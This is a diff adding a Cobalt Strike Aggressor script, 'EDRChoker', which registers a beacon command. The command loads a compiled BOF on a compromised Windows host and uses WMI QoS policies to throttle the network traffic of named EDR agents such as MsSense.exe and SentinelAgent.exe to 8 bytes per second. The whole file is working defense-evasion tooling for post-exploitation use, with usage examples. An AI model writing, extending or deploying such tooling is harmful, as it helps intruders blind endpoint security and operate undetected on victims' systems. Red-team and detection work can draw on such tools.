@@ -1,0 +1,59 @@
+# EDRChoker Aggressor Script — Cobalt Strike 4.x
+#
+# Load this script via Script Manager, then:
+#
+#   edrchoker MsSense.exe SentinelAgent.exe   -- throttle one or more processes
+#   edrchoker                                  -- remove all user QoS policies
+#
+# The BOF (edrchoker.o) must live in the same directory as this script.
+
+alias edrchoker {
+    local('$bid $bof $handle @procs $procStr $args $boffile');
+
+    $bid   = $1;
+    @procs = subarray(@_, 1);   # everything after the beacon ID
+
+    # ── Pick the right object file for this beacon's arch ───────────────────
+    $boffile = iff(barch($bid) eq "x86", "edrchoker.x86.o", "edrchoker.o");
+
+    # ── Load the compiled BOF ────────────────────────────────────────────────
+    $handle = openf(script_resource($boffile));
+    if (!$handle) {
+        berror($bid, "EDRChoker: cannot open $boffile — compile it first (make)");
+        return;
+    }
+    $bof = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($bof) == 0) {
+        berror($bid, "EDRChoker: edrchoker.o is empty");
+        return;
+    }
+
+    # ── Dispatch ─────────────────────────────────────────────────────────────
+    if (size(@procs) == 0) {
+        btask($bid, "EDRChoker: removing all user QoS policies");
+        beacon_execute_bof($bid, $bof, $null);
+    } else {
+        $procStr = join(";", @procs);
+        btask($bid, "EDRChoker: throttling -> " . $procStr);
+        $args = bof_pack("z", $procStr);
+        beacon_execute_bof($bid, $bof, $args);
+    }
+}
+
+beacon_command_register(
+    "edrchoker",
+    "Throttle EDR process network to ~0 via WMI QoS (MSFT_NetQosPolicySettingData)",
+    "Usage:  edrchoker [proc1.exe] [proc2.exe] ...\n" .
+    "        edrchoker (no args) removes all user-created QoS policies\n\n" .
+    "Examples:\n" .
+    "  edrchoker MsSense.exe\n" .
+    "  edrchoker MsSense.exe SentinelAgent.exe cb.exe\n" .
+    "  edrchoker\n\n" .
+    "Notes:\n" .
+    "  - Requires elevation (SYSTEM or local admin)\n" .
+    "  - Sets ThrottleRateAction to 8 bytes/sec per target process\n" .
+    "  - Policies are tagged Owner=1; cleanup only removes those\n" .
+    "  - Effective immediately; no reboot required"
+);
